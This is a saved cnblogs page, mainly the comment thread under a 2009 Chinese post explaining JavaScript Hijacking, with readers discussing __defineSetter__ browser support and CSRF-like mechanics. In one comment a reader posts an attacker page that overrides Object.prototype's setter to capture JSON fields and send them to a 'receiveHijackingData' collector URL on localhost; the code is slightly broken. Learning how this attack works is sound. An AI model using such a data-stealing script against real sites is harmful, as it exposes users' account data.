				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574230" class="layer">#12楼</a><a name="1574230" id="comment_anchor_1574230"></a></cite> <a id="a_comment_author_1574230" href="https://www.cnblogs.com/tsoukw/" target="_blank">Kevin Zou</a> <a href="http://msg.cnblogs.com/send/Kevin%20Zou" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 08:13</span></small>
			</h5>
			<div id="comment_body_1574230" class="blog_comment_body">__defineSetter__这个在IE系列的浏览器好像是不受支持的（在IE6下试了不行）<br><br>-----------------------<br>看來某些時候IE還是安全的嘛~</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574230,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574230,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574230_avatar" style="display:none;">http://pic.cnblogs.com/face/u8276.gif</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574246" class="layer">#13楼</a><a name="1574246" id="comment_anchor_1574246"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1574246" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 08:25</span></small>
			</h5>
			<div id="comment_body_1574246" class="blog_comment_body">@Ivony...<br>呵呵，其实这个也不算什么新东西了，早在2007年国外已经提出了来了，只不过国内关于这个的介绍比较少。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574246,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574246,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574246_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574247" class="layer">#14楼</a><a name="1574247" id="comment_anchor_1574247"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1574247" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 08:29</span></small>
			</h5>
			<div id="comment_body_1574247" class="blog_comment_body">@James.Ying<br>恩，不过不是所有的多Tab浏览器都有这种特性，IE8虽然也是多TAB浏览器但好像可以防御CSRF这类攻击，详细得再确认。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574247,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574247,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574247_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574248" class="layer">#15楼</a><a name="1574248" id="comment_anchor_1574248"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1574248" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 08:29</span></small>
			</h5>
			<div id="comment_body_1574248" class="blog_comment_body">@Kevin Zou<br>可以这么说吧:&gt;</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574248,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574248,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574248_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574350" class="layer">#16楼</a><a name="1574350" id="comment_anchor_1574350"></a></cite> <a id="a_comment_author_1574350" href="https://www.cnblogs.com/beyondjay/" target="_blank">helloworld22</a> <a href="http://msg.cnblogs.com/send/helloworld22" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 09:54</span></small>
			</h5>
			<div id="comment_body_1574350" class="blog_comment_body">--引用--------------------------------------------------<br>Kevin Zou: __defineSetter__这个在IE系列的浏览器好像是不受支持的（在IE6下试了不行）<br><br>-----------------------<br>看來某些時候IE還是安全的嘛~<br>--------------------------------------------------------<br><br>那这个应用范围有点窄:)<br></div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574350,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574350,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574350_avatar" style="display:none;">http://pic.cnblogs.com/face/u24912.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574547" class="layer">#17楼</a><a name="1574547" id="comment_anchor_1574547"></a></cite> <a id="a_comment_author_1574547" href="https://www.cnblogs.com/SilverLight/" target="_blank">要有好的心情</a> <a href="http://msg.cnblogs.com/send/%E8%A6%81%E6%9C%89%E5%A5%BD%E7%9A%84%E5%BF%83%E6%83%85" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 12:55</span></small>
			</h5>
			<div id="comment_body_1574547" class="blog_comment_body">深入理解JackScript Hijacking原理<br>OR<br>深入理解JavaScript Hijacking原理 ?</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574547,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574547,&#39;Bury&#39;,this)">反对(0)</a></div>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574643" class="layer">#18楼</a><a name="1574643" id="comment_anchor_1574643"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1574643" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 14:32</span></small>
			</h5>
			<div id="comment_body_1574643" class="blog_comment_body">@要有好的心情<br>好寒的错误啊-_-!!，谢谢提醒！</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574643,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574643,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574643_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574644" class="layer">#19楼</a><a name="1574644" id="comment_anchor_1574644"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1574644" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 14:36</span></small>
			</h5>
			<div id="comment_body_1574644" class="blog_comment_body">@airwolf2026
没有研究过这个，有空看看。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574644,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574644,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574644_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574718" class="layer">#20楼</a><a name="1574718" id="comment_anchor_1574718"></a></cite> <a id="a_comment_author_1574718" href="https://www.cnblogs.com/reddust/" target="_blank">红尘中迷茫</a> <a href="http://msg.cnblogs.com/send/%E7%BA%A2%E5%B0%98%E4%B8%AD%E8%BF%B7%E8%8C%AB" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 15:40</span></small>
			</h5>
			<div id="comment_body_1574718" class="blog_comment_body">（4）.恶意站点向请求用户访问<a href="http://www.bank.xn--com-s18doh465pewljl8b/" target="_new">http://www.Bank.com的一个资源</a>。
<br>
<br>这一步是怎么做到的？恶意站点怎么会知道用户访问过Bank.com？还有它如何向请求用户访问Bank.com的一个资源？</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574718,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574718,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574718_avatar" style="display:none;">http://pic.cnblogs.com/face/u345.gif</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574746" class="layer">#21楼</a><a name="1574746" id="comment_anchor_1574746"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1574746" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-03 16:38</span></small>
			</h5>
			<div id="comment_body_1574746" class="blog_comment_body">@红尘中迷茫<br>1.这个恶意站点是不知道用户到底有没有访问过的，这只能是恶意网站碰运气，或者在有漏洞信任站点上传恶意脚本，达到搭顺风车的目的。<br>2.script type="text/javascript" src="<a href="http://www.bank.com/UserInfo%22%3E%3C/script%3E" target="_new">http://www.Bank.com/UserInfo"&gt;&lt;/script&gt;</a></div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574746,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574746,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1574746_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1574778" class="layer">#22楼</a><a name="1574778" id="comment_anchor_1574778"></a></cite> <a id="ctl00_CommentList_NameLink_21" href="http://space.cnblogs.com/60926/" target="_blank">RedHackerguy</a><small> <span class="comment_date">2009-07-03 17:17</span></small>
			</h5>
			<div id="comment_body_1574778" class="blog_comment_body">看不懂想学，先MARK一下</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1574778,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1574778,&#39;Bury&#39;,this)">反对(0)</a></div>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1576149" class="layer">#23楼</a><a name="1576149" id="comment_anchor_1576149"></a></cite> <a id="a_comment_author_1576149" href="https://www.cnblogs.com/Casoul/" target="_blank">北木玄</a> <a href="http://msg.cnblogs.com/send/%E5%8C%97%E6%9C%A8%E7%8E%84" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-05 21:07</span></small>
			</h5>
			<div id="comment_body_1576149" class="blog_comment_body">__defineSetter__这玩意是FF浏览器私有的，因此除了FF以外的浏览器都是不支持的。<br>这个东西有点类似C#中的Set<br>当然这里说到javascript劫持，IE浏览器都是支持的，只是写法上的问题</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1576149,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1576149,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1576149_avatar" style="display:none;">http://pic.cnblogs.com/face/41558/20160825002123.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1577235" class="layer">#24楼</a><a name="1577235" id="comment_anchor_1577235"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1577235" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-06 23:16</span></small>
			</h5>
			<div id="comment_body_1577235" class="blog_comment_body"><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1576149" title="查看所回复的评论" onclick="commentManager.renderComments(0,50,1576149);">@</a>
卡索<br>恩，谢谢提醒:&gt;</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1577235,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1577235,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1577235_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1586683" class="layer">#25楼</a><a name="1586683" id="comment_anchor_1586683"></a></cite> <a id="a_comment_author_1586683" href="https://www.cnblogs.com/strawberryww/" target="_blank">strawberryww</a> <a href="http://msg.cnblogs.com/send/strawberryww" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-16 16:36</span></small>
			</h5>
			<div id="comment_body_1586683" class="blog_comment_body">博主，您好，看了您的文章大受启发，不过我按照您的思路自己试验了一下，但是没有成功，不知道什么原因。<br><br>这是受攻击的网站 Default.html, 它向服务器请求一个JSON数组：[{"Id":3,"Name":hyddd,"Money":10000}]<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Untitled Page&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;script type="text/javascript"&gt;<br>    var object;<br>    var req = new XMLHttpRequest();<br>    req.open("GET", "<a href="http://localhost/" target="_blank">http://localhost</a>:2941/JavaScriptHijacking/Default.aspx",true);<br>    req.onreadystatechange = function () {<br>    if (req.readyState == 4) {<br>        var txt = req.responseText;<br>        object = eval("(" + txt + ")");<br>        req = null;<br>        }<br>    };<br>    req.send(null);<br>    &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br>这是攻击 Default.html 的网站 hijacking.html<br> &lt;html&gt;<br> &lt;head&gt;<br>    &lt;title&gt;hijacking&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br>&lt;script type="text/javascript"&gt;<br>    Object.prototype.__defineSetter__('Money', <br>        function(obj) { <br>            var objString = "";  <br>            for (fld in this) {<br>                objString += fld + ": " + this[fld] + ", "; <br>            }  <br>            var req = new XMLHttpRequest();<br>            req.open("GET", "<a href="http://localhost/" target="_blank">http://localhost</a>:2941/JavaScriptHijacking/receiveHijackingData.aspx?obj=" +<br>            escape(objString),true);<br>            <br>        } <br>            req.send(null); <br>        );<br> &lt;/script&gt;<br><br> &lt;script src="<a href="http://localhost/" target="_blank">http://localhost</a>:2941/JavaScriptHijacking/Default.aspx"&gt; &lt;/script&gt; <br> &lt;/body&gt;<br>&lt;/html&gt;<br><br>为什么我在receiveHijackingData.aspx上无法获得JSON数据？<br>它始终没有响应Object.prototype.__defineSetter__这个事件……<br>我的测试环境windows xp sp3，iis 5.1, firefox 3.0<br>或者您有实际的例子吗？多谢博主！！！</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1586683,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1586683,&#39;Bury&#39;,this)">反对(0)</a></div>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#1589736" class="layer">#26楼</a><a name="1589736" id="comment_anchor_1589736"></a>[<span class="louzhu">楼主</span>]</cite> <a id="a_comment_author_1589736" href="https://www.cnblogs.com/hyddd/" target="_blank">hyddd</a> <a href="http://msg.cnblogs.com/send/hyddd" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2009-07-20 09:31</span></small>
			</h5>
			<div id="comment_body_1589736" class="blog_comment_body">@strawberryww<br>1.先确认返回的数据有没有问题，抓个包看看。<br>2.如果数据没有问题，直接返回一个js文件试试“&lt;script src="<a href="http://localhost/" target="_blank">http://localhost</a>:2941/hacker。js"&gt; &lt;/script&gt; ”，看能不能触发Object.prototype.__defineSetter__<br></div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(1589736,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(1589736,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_1589736_avatar" style="display:none;">http://pic.cnblogs.com/face/u46057.png</span>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#2280655" class="layer">#27楼</a><a name="2280655" id="comment_anchor_2280655"></a></cite> <a id="a_comment_author_2280655" href="https://www.cnblogs.com/bombless/" target="_blank">bombless</a> <a href="http://msg.cnblogs.com/send/bombless" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2011-12-27 16:08</span></small>
			</h5>
			<div id="comment_body_2280655" class="blog_comment_body">我试了下貌似我这FF8.0.1都没有__defineSetter__这东西了。不过Chrome还是有的，于是还有得做实验。。<br><br>不同2个Tab之间能够分享__defineSetter__的设置本来就很奇怪。。特别是2个Tab所处的域都不同的情况下。。<br><br>感谢博主分享~长知识了~</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(2280655,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(2280655,&#39;Bury&#39;,this)">反对(0)</a></div>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
		<li class="alt">
			<h5>
				<cite><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#2280782" class="layer">#28楼</a><a name="2280782" id="comment_anchor_2280782"></a><span id="comment-maxId" style="display:none;">2280782</span><span id="comment-maxDate" style="display:none;">2011/12/27 18:30:04</span></cite> <a id="a_comment_author_2280782" href="https://www.cnblogs.com/bombless/" target="_blank">bombless</a> <a href="http://msg.cnblogs.com/send/bombless" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2011-12-27 18:30</span></small>
			</h5>
			<div id="comment_body_2280782" class="blog_comment_body">噢。。刚刚又看到<a href="http://blog.roodo.com/rocksaying/archives/2955557.html" target="_blank">http://blog.roodo.com/rocksaying/archives/2955557.html</a><br>看来是我误解了，这个JavaScript Hijacking原来和CSRF差不多。。只是换成了由script标签来伪造登陆而已。。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(2280782,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(2280782,&#39;Bury&#39;,this)">反对(0)</a></div>
			<div class="opt_comment"><span class="comment_actions"></span></div>
		</li>
	
</ol>

<script language="javascript" type="text/javascript">
    var m = window.__blog.commentListRendered;
    if (m) { m(__$("commentList")); }
</script><div id="comments_pager_bottom"></div></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
<div id="comment_form" class="commentform">
<a name="commentform"></a>
<div id="divCommentShow"></div>
<div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#" onclick="return RefreshPage();">刷新页面</a><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm#top">返回顶部</a></div>
<div id="comment_form_container"><div class="login_tips">注册用户登录后才能发表评论，请 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return login(&#39;commentform&#39;);">登录</a> 或 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return register();">注册</a>，<a href="http://www.cnblogs.com/">访问</a>网站首页。</div></div>
<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
<div id="ad_t2"><a href="http://www.ucancode.com/index.htm" target="_blank" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;T2-工控&#39;)">【推荐】超50万C++/C#源码: 大型实时仿真组态图形源码</a><br><a href="https://www.grapecity.com.cn/developer/spreadjs?utm_source=cnblogs&amp;utm_medium=blogpage&amp;utm_term=bottom&amp;utm_content=SpreadJS&amp;utm_campaign=community" target="_blank" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;T2-SpreadJS&#39;)">【前端】SpreadJS表格控件，可嵌入系统开发的在线Excel</a><br><a href="https://q.cnblogs.com/" target="_blank" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;T2-博问&#39;)">【推荐】程序员问答平台，解决您开发中遇到的技术难题</a><br></div>
<div id="opt_under_post"></div>
<script async="async" src="./20190721JSHijacking_files/gpt.js.下载"></script>
<script>
  var googletag = googletag || {};
  googletag.cmd = googletag.cmd || [];
</script>
<script>
  googletag.cmd.push(function() {
        googletag.defineSlot('/1090369/C1', [300, 250], 'div-gpt-ad-1546353474406-0').addService(googletag.pubads());
        googletag.defineSlot('/1090369/C2', [468, 60], 'div-gpt-ad-1539008685004-0').addService(googletag.pubads());
        googletag.pubads().enableSingleRequest();
        googletag.enableServices();
  });
</script>
<div id="cnblogs_c1" class="c_ad_block">
    <div id="div-gpt-ad-1546353474406-0" style="height:250px; width:300px;" data-google-query-id="CNW5l6O_xeMCFYoslgodedUBSw"><div id="google_ads_iframe_/1090369/C1_0__container__" style="border: 0pt none;"><iframe id="google_ads_iframe_/1090369/C1_0" title="3rd party ad content" name="google_ads_iframe_/1090369/C1_0" width="300" height="250" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" style="border: 0px; vertical-align: bottom;" data-google-container-id="1" data-load-complete="true" src="./20190721JSHijacking_files/saved_resource.html"></iframe></div></div>
</div>
<div id="under_post_news"><div class="recomm-block"><b>相关博文：</b><br>·  <a href="https://www.cnblogs.com/dujunlin/p/10607990.html" target="_blank" onclick="clickRecomItmem(10607990)">理解爬虫原理</a><br>·  <a href="https://www.cnblogs.com/erbingbing/p/10318097.html" target="_blank" onclick="clickRecomItmem(10318097)">《前端之路》之前端安全XSS原理以及防御手段</a><br>·  <a href="https://www.cnblogs.com/cyniczzz/p/5605066.html" target="_blank" onclick="clickRecomItmem(5605066)">简单理解jsonp原理</a><br>·  <a href="https://www.cnblogs.com/xiaowuzi/p/3554905.html" target="_blank" onclick="clickRecomItmem(3554905)">常见网站的两种攻击方式</a><br>·  <a href="https://www.cnblogs.com/welan/p/9460889.html" target="_blank" onclick="clickRecomItmem(9460889)">django-xss攻击原理与防范</a><br></div></div>
<div id="cnblogs_c2" class="c_ad_block">
    <div id="div-gpt-ad-1539008685004-0" style="height:60px; width:468px;" data-google-query-id="CNa5l6O_xeMCFYoslgodedUBSw"><div id="google_ads_iframe_/1090369/C2_0__container__" style="border: 0pt none;"><iframe id="google_ads_iframe_/1090369/C2_0" title="3rd party ad content" name="google_ads_iframe_/1090369/C2_0" width="468" height="60" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" style="border: 0px; vertical-align: bottom;" data-google-container-id="2" data-load-complete="true" src="./20190721JSHijacking_files/saved_resource(1).html"></iframe></div></div>
</div>
<div id="under_post_kb"><div class="itnews c_ad_block"><b>最新新闻</b>：<br> ·  <a href="https://news.cnblogs.com/n/628538/" target="_blank">10万镜子反射月光，组成3.6平方公里巨幅头像，谷歌花式纪念登月50年</a><br> ·  <a href="https://news.cnblogs.com/n/628537/" target="_blank">新款可穿戴设备利用膝盖弯曲发电</a><br> ·  <a href="https://news.cnblogs.com/n/628536/" target="_blank">史上最接近真实的《狮子王》是怎么拍出来的？</a><br> ·  <a href="https://news.cnblogs.com/n/628535/" target="_blank">借助语音识别技术，这些印度公司要将方言服务进行到底</a><br> ·  <a href="https://news.cnblogs.com/n/628534/" target="_blank">检测新利器！科学家将引力波探测器缩小了</a><br>» <a href="http://news.cnblogs.com/" title="IT新闻" target="_blank">更多新闻...</a></div></div>
<div id="HistoryToday" class="c_ad_block"></div>
<script type="text/javascript">
 if(enablePostBottom()) {
    codeHighlight();
    fixPostBody();
    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
    deliverT2();
    deliverC1();
    deliverC2();    
    loadNewsAndKb();
    loadBlogSignature();
    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
    loadOptUnderPost();
    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);  
}
</script>
</div>

    
        </div>

        <script type="text/javascript">
            var m = window.__blog.contentRendered;
            if (m) { m(__$("content")); }
        </script>

        <div id="sidebar">
            
<div id="about">
<div>
<h2 id="about_title">About</h2>
<div id="about_body">
<div id="blog-news"><div>

<div>
<img class="W_face_radius" style="border-radius: 50%;display: block; 
margin:auto;" src="./20190721JSHijacking_files/1" width="60" height="60" alt="hyddd">
</div>

<p>Hi，<strong>我是hyddd（陈曦明）</strong>，毕业于吉林大学，现就职于腾讯，从事自动化测试、音视频方向工作。有任何问题，可<a href="mailto::hydddchen@gmail.com">邮件</a>与我联系，欢迎交流。</p>

<p>Hi, I'm ChenXiming. A programmer from Tencent, home@GuangZhou, China. If you want to get in touch with me, send the <a href="mailto::hydddchen@gmail.com">email</a>.</p>

</div>

<div id="my_writing">
<p><strong>知识共享许可协议</strong>：本站作品由<a href="http://hyddd.cnblogs.com/">hyddd</a>创作，欢迎转载，演绎或用于商业目的，但是必须说明作品出处（包含链接）。</p>
<p>想更一进步的支持我，请扫描下方的二维码，你懂的！~</p>
<img style="width:200px;" src="./20190721JSHijacking_files/o_pay2me.png">
</div>

<div id="my_link" style="margin-top:20px;">
<div>
<a href="http://weibo.com/hydddchen" target="_blank">
<img border="0" alt="" align="absMiddle" src="./20190721JSHijacking_files/o_sina.jpg">&nbsp;&nbsp;我的新浪微博
</a>
</div>

<div>
<a href="http://www.cnblogs.com/hyddd/rss" target="_blank">
<img style="border-bottom: medium none; border-left: medium none; border-top: medium none; border-right: medium none" border="0" alt="订阅我的博客" align="absMiddle" src="./20190721JSHijacking_files/o_feed-icon32x32.png">
&nbsp;订阅我的博客
</a>
</div>
</div>


<script type="text/javascript">window['__document_write_ajax_callbacks__']['4']();</script><script>window['__document_write_ajax_callbacks__']['1']();</script>

<script type="text/javascript">window['__document_write_ajax_callbacks__']['5']();</script><script type="text/javascript">window['__document_write_ajax_callbacks__']['2']();</script><div id="profile_block">昵称：<a href="https://home.cnblogs.com/u/hyddd/">hyddd</a><br>园龄：<a href="https://home.cnblogs.com/u/hyddd/" title="入园时间：2008-12-16">10年7个月</a><br>粉丝：<a href="https://home.cnblogs.com/u/hyddd/followers/">1541</a><br>关注：<a href="https://home.cnblogs.com/u/hyddd/followees/">3</a><div id="p_b_follow"><a href="javascript:void(0);" onclick="follow(&#39;9208470b-63cf-dd11-9e4d-001cf0cd104b&#39;)">+加关注</a></div><script type="text/javascript">window['__document_write_ajax_callbacks__']['6']();</script><script>window['__document_write_ajax_callbacks__']['3']();</script></div></div>
<script type="text/javascript">loadBlogNews();</script>
</div>
</div>
</div>

            <script type="text/javascript">
                var m = window.__blog.aboutRendered;
                if (m) { m(__$("about")); }
            </script>
            
<div id="mySearchWrapper">
    <div id="mySearch">
        <input type="image" src="./20190721JSHijacking_files/btnsearch.gif" id="btnZzk" class="submit" onclick="zzk_go();return false;">
        <label class="lb_search"><input type="text" id="q" onkeydown="return zzk_go_enter(event);" class="keyword"></label>
    </div>
</div>

            <script type="text/javascript">
                var m = window.__blog.searchFormRendered;
                if (m) { m(__$("searchform")); }
            </script>
            <div id="sideMain">
            <div id="side-recent-posts">
        <h2>最新随笔</h2>
        <ul class="bullet">
                <li><a href="https://www.cnblogs.com/hyddd/p/11175919.html">在FPS游戏中，玩家对音画同步感知的量化与评估</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/7718184.html">浅析HSTS</a></li>
